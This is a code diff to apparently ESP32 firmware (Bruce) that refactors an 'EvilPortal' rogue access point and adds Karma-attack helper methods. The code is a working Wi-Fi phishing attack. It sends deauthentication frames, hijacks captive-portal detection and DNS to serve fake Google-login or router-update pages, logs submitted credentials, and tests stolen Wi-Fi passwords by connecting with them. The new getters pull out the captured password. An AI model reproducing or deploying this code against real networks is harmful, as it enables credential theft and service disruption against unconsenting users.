@@ -11,12 +11,17 @@
 EvilPortal::EvilPortal(String tssid, uint8_t channel, bool deauth, bool verifyPwd, bool autoMode)
     : apName(tssid), _channel(channel), _deauth(deauth), _verifyPwd(verifyPwd), _autoMode(autoMode), webServer(80) {
     if (!setup()) return;
-
     beginAP();
     loop();
 };
 
 EvilPortal::~EvilPortal() {
+    // Clean up handler to prevent memory leak
+    if (_captiveHandler) {
+        webServer.removeHandler(_captiveHandler);
+        delete _captiveHandler;
+        _captiveHandler = nullptr;
+    }
     webServer.end();
     dnsServer.stop();
     vTaskDelay(100 / portTICK_PERIOD_MS);
@@ -45,38 +50,34 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
         else _portal->portalController(request);
     }
 }
+
 bool EvilPortal::setup() {
-    // Auto-mode for karma attack - skip menu and load template directly
     if (_autoMode) {
-        // Choose template based on AP name or verification flag
         if (apName.indexOf("router") != -1 || apName.indexOf("update") != -1 || 
             apName.indexOf("firmware") != -1 || _verifyPwd) {
-            loadDefaultHtml_one(); // Router update template
+            loadDefaultHtml_one();
         } else {
-            loadDefaultHtml(); // Default Google login
+            loadDefaultHtml();
         }
         return true;
     }
 
-    // Manual mode - show template selection menu
     options = {
         {"Custom Html", [this]() { loadCustomHtml(); }}
     };
     addOptionToMainMenu();
 
     if (!_verifyPwd) {
-        // Insert Options
         options.insert(options.begin(), {"Default", [this]() { loadDefaultHtml(); }});
     } else {
         options.insert(options.begin(), {"Default", [this]() { loadDefaultHtml_one(); }});
     }
 
     loopOptions(options);
-
     if (returnToMenu) return false;
 
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-    wsl_bypasser_send_raw_frame(&ap_record, _channel); // writes the buffer with the information
+    wsl_bypasser_send_raw_frame(&ap_record, _channel);
 
     if (apName == "") {
         if (bruceConfig.evilWifiNames.empty()) {
@@ -85,17 +86,15 @@ bool EvilPortal::setup() {
             options = {
                 {"Custom Wifi", [this]() { apName_from_keyboard(); }}
             };
-
             for (const auto &_wifi : bruceConfig.evilWifiNames) {
                 options.emplace_back(_wifi.c_str(), [this, _wifi]() { this->apName = _wifi; });
             }
-
             loopOptions(options);
         }
     }
 
     options = {
-        {"172.0.0.1",   [this]() { apGateway = IPAddress(172, 0, 0, 1); }  },
+        {"172.0.0.1",   [this]() { apGateway = IPAddress(172, 0, 0, 1); }},
         {"192.168.4.1", [this]() { apGateway = IPAddress(192, 168, 4, 1); }},
     };
 
@@ -107,9 +106,7 @@ bool EvilPortal::setup() {
 
 void EvilPortal::beginAP() {
     drawMainBorderWithTitle("EVIL PORTAL");
-
     displayTextLine("Starting...");
-    // WIFI_MODE_APSTA captive portal takes time to popup, but is useful for verifying Wifi credentials
     if (_verifyPwd) WiFi.mode(WIFI_MODE_APSTA);
     else WiFi.mode(WIFI_MODE_AP);
     WiFi.softAPConfig(apGateway, apGateway, IPAddress(255, 255, 255, 0));
@@ -124,47 +121,38 @@ void EvilPortal::beginAP() {
     webServer.begin();
 }
 
-// Improved captive portal detection for modern devices
 void EvilPortal::setupRoutes() {
-    // Modern captive portal detection URLs (most important for notifications)
     webServer.on("/generate_204", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        // Apple devices and many Android devices check this
         AsyncWebServerResponse *response = request->beginResponse(302);
         response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
         request->send(response);
     });
 
     webServer.on("/gen_204", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        // Alternative for some devices
         AsyncWebServerResponse *response = request->beginResponse(302);
         response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
         request->send(response);
     });
 
     webServer.on("/hotspot-detect.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        // Apple specific
         request->send(200, "text/html", "<html><head><meta http-equiv=\"refresh\" content=\"0;url=http://" + WiFi.softAPIP().toString() + "\"></head><body></body></html>");
     });
 
     webServer.on("/library/test/success.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        // Apple specific
         AsyncWebServerResponse *response = request->beginResponse(302);
         response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
         request->send(response);
     });
 
     webServer.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
-        // Windows captive portal detection
         request->send(200, "text/plain", "Microsoft NCSI");
     });
 
     webServer.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
-        // Windows 10/11 captive portal detection
         request->send(200, "text/plain", "Microsoft Connect Test");
     });
 
     webServer.on("/redirect", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        // Generic redirect endpoint
         AsyncWebServerResponse *response = request->beginResponse(302);
         response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
         request->send(response);
@@ -186,24 +174,18 @@ void EvilPortal::setupRoutes() {
         request->send(response);
     });
 
-    // Add proper DNS responses for captive portal detection
     webServer.on("/detectportal.firefox.com/success.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
-        // Firefox captive portal detection
         request->send(200, "text/plain", "success");
     });
 
     webServer.on("/client.msftconnecttest.com/redirect", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        // Windows specific
         AsyncWebServerResponse *response = request->beginResponse(302);
         response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
         request->send(response);
     });
 
-    // Add DNS masquerading for all domains (CRITICAL)
     webServer.on("^\\/(.*)$", HTTP_GET, [this](AsyncWebServerRequest *request) {
         String url = request->url();
-        
-        // Check if it's a known captive portal URL
         if (url == "/" || 
             url == "/generate_204" || 
             url == "/gen_204" ||
@@ -219,17 +201,15 @@ void EvilPortal::setupRoutes() {
             url.indexOf("connecttest") != -1 ||
             url.indexOf("msftconnecttest") != -1 ||
             url.indexOf("clients3.google.com") != -1) {
-            // Let the specific handlers deal with these
             request->send(404);
         } else {
-            // For all other URLs, redirect to portal
             portalController(request);
         }
     });
 
-    // Original routes
     webServer.on("/", [this](AsyncWebServerRequest *request) { portalController(request); });
     webServer.on("/post", [this](AsyncWebServerRequest *request) { credsController(request); });
+    
     if (bruceConfig.evilPortalEndpoints.allowGetCreds) {
         webServer.on(
             bruceConfig.evilPortalEndpoints.getCredsEndpoint.c_str(),
@@ -252,8 +232,6 @@ void EvilPortal::setupRoutes() {
 
     webServer.onNotFound([this](AsyncWebServerRequest *request) {
         String url = request->url();
-
-        // Handle common captive portal URLs that weren't caught
         if (url.indexOf("detectportal") != -1 || 
             url.indexOf("connecttest") != -1 ||
             url.indexOf("success") != -1 ||
@@ -272,27 +250,37 @@ void EvilPortal::setupRoutes() {
         }
     });
 
-    // Add DNS masquerading handler
-    webServer.addHandler(new CaptiveRequestHandler(this)).setFilter(ON_AP_FILTER);
+    // Store handler pointer for cleanup
+    _captiveHandler = new CaptiveRequestHandler(this);
+    webServer.addHandler(_captiveHandler).setFilter(ON_AP_FILTER);
 }
 
 void EvilPortal::restartWiFi(bool reset) {
+    // Clean up old handler before restart
+    if (_captiveHandler) {
+        webServer.removeHandler(_captiveHandler);
+        delete _captiveHandler;
+        _captiveHandler = nullptr;
+    }
+    
     webServer.end();
     wifiDisconnect();
     WiFi.softAP(apName);
     webServer.begin();
-
-    // code to handle whether to reset the counter..
-
-    if (reset) { resetCapturedCredentials(); }
+    
+    // Re-add handler
+    _captiveHandler = new CaptiveRequestHandler(this);
+    webServer.addHandler(_captiveHandler).setFilter(ON_AP_FILTER);
+    
+    if (reset) resetCapturedCredentials();
 }
 
 void EvilPortal::resetCapturedCredentials(void) {
-    previousTotalCapturedCredentials = -1; // Reset captured credentials count
+    previousTotalCapturedCredentials = -1;
 }
 
 void EvilPortal::loop() {
-    int lastDeauthTime = millis(); // one deauth frame each 30ms at least
+    int lastDeauthTime = millis();
     bool shouldRedraw = true;
 
     while (true) {
@@ -304,7 +292,7 @@ void EvilPortal::loop() {
         dnsServer.processNextRequest();
 
         if (!isDeauthHeld && (millis() - lastDeauthTime) > 250 && _deauth) {
-            send_raw_frame(deauth_frame, 26); // Sends deauth frames if needed
+            send_raw_frame(deauth_frame, 26);
             lastDeauthTime = millis();
         }
 
@@ -352,7 +340,6 @@ void EvilPortal::drawScreen() {
     }
     padprintln("");
 
-    // Added captive portal status indicator
     padprintln("Captive Portal: ACTIVE");
     padprintln("Notifications: ENABLED");
 
@@ -370,7 +357,6 @@ void EvilPortal::drawScreen() {
     }
     padprintln("Pwd mode: " + passMode);
     printLastCapturedCredential();
-
     printDeauthStatus();
 }
 
@@ -399,34 +385,28 @@ void EvilPortal::printDeauthStatus() {
 
 void EvilPortal::loadCustomHtml() {
     getFsStorage(fsHtmlFile);
-
     htmlFileName = loopSD(*fsHtmlFile, true, "HTML");
-    String fileBaseName =
-        htmlFileName.substring(htmlFileName.lastIndexOf("/") + 1, htmlFileName.length() - 5);
+    String fileBaseName = htmlFileName.substring(htmlFileName.lastIndexOf("/") + 1, htmlFileName.length() - 5);
     fileBaseName.toLowerCase();
-
     outputFile = fileBaseName + "_creds.csv";
     isDefaultHtml = false;
 
-    // Open the file and read the first line (searching for: <!-- AP="..." -->)
     File htmlFile = fsHtmlFile->open(htmlFileName, FILE_READ);
     if (htmlFile) {
-        String firstLine = htmlFile.readStringUntil('\n'); // Read the first line
+        String firstLine = htmlFile.readStringUntil('\n');
         htmlFile.close();
-
-        // Look for the AP tag in the first line
         int apStart = firstLine.indexOf("<!-- AP=\"");
         if (apStart != -1) {
             int apEnd = firstLine.indexOf("\" -->", apStart);
             if (apEnd != -1) {
-                apName = firstLine.substring(apStart + 9, apEnd); // Extract the AP name
+                apName = firstLine.substring(apStart + 9, apEnd);
             }
         }
     }
 }
 
 String EvilPortal::wifiLoadPage() {
-    PROGMEM String wifiLoad =
+    return String(
         "<!DOCTYPE html><html><head> <meta charset='UTF-8'> <meta name='viewport' "
         "content='width=device-width, initial-scale=1.0'> </style></head><body> <div class='container'> <div "
         "class='logo-container'> <?xml version='1.0' standalone='no'?> <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG "
@@ -455,8 +435,8 @@ String EvilPortal::wifiLoadPage() {
         "function showNextPath() { if (index < paths.length) { paths[index].style.display = 'block'; "
         "index++; } } function hideAllPaths() { paths.forEach(path => { path.style.display = 'none'; }); "
         "index = 0; } hideAllPaths(); setInterval(function() { if (index < paths.length) { showNextPath(); } "
-        "else { hideAllPaths(); } }, 1000); </script></body></html>";
-    return wifiLoad;
+        "else { hideAllPaths(); } }, 1000); </script></body></html>"
+    );
 }
 
 void EvilPortal::loadDefaultHtml_one() {
@@ -575,7 +555,6 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
             continue;
         }
 
-        // get key if verify and before blanking
         if (key == "password" && _verifyPwd) { passwordValue = request->arg(i); }
 
         String valueBuffer = request->arg(i);
@@ -584,31 +563,23 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
             char blank = '*';
             switch (bruceConfig.evilPortalPasswordMode) {
                 case FULL_PASSWORD:
-                    // do nothing, already have full password and want to save it
                     break;
                 case FIRST_LAST_CHAR:
-                    // overwrite the middle of the passwordValue with *s
                     if (valueBuffer.length() > 2) {
                         for (int i = 1; i < valueBuffer.length() - 1; i++) { valueBuffer[i] = blank; }
                     }
-                    // otherwise don't blank anything if pwd is < 2 chars
                     break;
                 case HIDE_PASSWORD:
-                    // overwrite the passwordValue with '*hidden*'
                     valueBuffer = "*hidden*";
                     break;
                 case SAVE_LENGTH:
-                    // overwrite the passwordValue with 'X chars'
                     valueBuffer = String(valueBuffer.length()) + " chars";
                     break;
             }
         }
 
-        // Build HTML and CSV line
         htmlResponse += key + ": " + valueBuffer + "<br>\n";
         if (i > 0) { csvLine += ","; }
-
-        // Skip irrelevant parameters
 
         csvLine += key + ": " + valueBuffer;
         lastCred += key.substring(0, 3) + ": " + valueBuffer + "\n";
@@ -618,27 +589,19 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
 
     if (_verifyPwd && passwordValue != "") {
         request->send(200, "text/html", wifiLoadPage());
-        // vTaskDelay(200 / portTICK_PERIOD_MS); // give it time to process the request
         bool isCorrect = verifyCreds(apName, passwordValue);
         if (isCorrect) {
-
-            // Display valid to screen if valid..
             lastCred += "valid: true\nStopping server...";
             saveToCSV(csvLine + ", valid: true", true);
             printDeauthStatus();
-
-            // save to WiFi creds if the pwd was correct.
             if (bruceConfig.getWifiPassword(apName) != "") {
                 bruceConfig.addWifiCredential(apName, passwordValue);
             }
             vTaskDelay(50 / portTICK_PERIOD_MS);
-            // stop further actions...
             verifyPass = true;
             _deauth = false;
-
         } else {
             lastCred += "valid: false";
-            // still save invalid creds...
             saveToCSV(csvLine + ", valid: false", true);
             portalController(request);
         }
@@ -652,7 +615,7 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
 }
 
 String EvilPortal::getHtmlTemplate(String body) {
-    PROGMEM String html =
+    return String(
         "<!DOCTYPE html>"
         "<html>"
         "<head>"
@@ -697,8 +660,8 @@ String EvilPortal::getHtmlTemplate(String body) {
         "    </div>"
         "  </div>"
         "</body>"
-        "</html>";
-    return html;
+        "</html>"
+    );
 }
 
 String EvilPortal::creds_GET() {
@@ -755,18 +718,14 @@ void EvilPortal::saveToCSV(const String &csvLine, bool isAPname) {
 void EvilPortal::apName_from_keyboard() { apName = keyboard("Free Wifi", 30, "Evil Portal SSID:"); }
 
 bool EvilPortal::verifyCreds(String &Ssid, String &Password) {
-
     bool isConnected = false;
-
-    // temporary stop deauth if deauth + clone is true
     bool temp = _deauth;
     _deauth = false;
-    // Try to connect to wifi
     WiFi.begin(Ssid, Password);
 
     int i = 1;
     while (WiFi.status() != WL_CONNECTED) {
-        if (i > 12) break; // 12 times, 6 seconds
+        if (i > 12) break;
         vTaskDelay(500 / portTICK_PERIOD_MS);
         i++;
     }
@@ -774,8 +733,33 @@ bool EvilPortal::verifyCreds(String &Ssid, String &Password) {
     if (WiFi.status() == WL_CONNECTED) { isConnected = true; }
 
     WiFi.disconnect(false);
-    // re enable
     _deauth = temp;
-
     return isConnected;
+}
+
+/////////////////////////////////////////////////////////////////////////////
+// Karma Integration Methods
+/////////////////////////////////////////////////////////////////////////////
+
+bool EvilPortal::hasCredentials() {
+    return totalCapturedCredentials > 0 && lastCred.length() > 0;
+}
+
+String EvilPortal::getCapturedSSID() {
+    return apName;
+}
+
+String EvilPortal::getCapturedPassword() {
+    int pwdStart = lastCred.indexOf("pwd: ");
+    if (pwdStart == -1) pwdStart = lastCred.indexOf("pass: ");
+    if (pwdStart == -1) pwdStart = lastCred.indexOf("password: ");
+    
+    if (pwdStart != -1) {
+        pwdStart = lastCred.indexOf(": ", pwdStart) + 2;
+        int pwdEnd = lastCred.indexOf("\n", pwdStart);
+        if (pwdEnd != -1) {
+            return lastCred.substring(pwdStart, pwdEnd);
+        }
+    }
+    return "";
 }
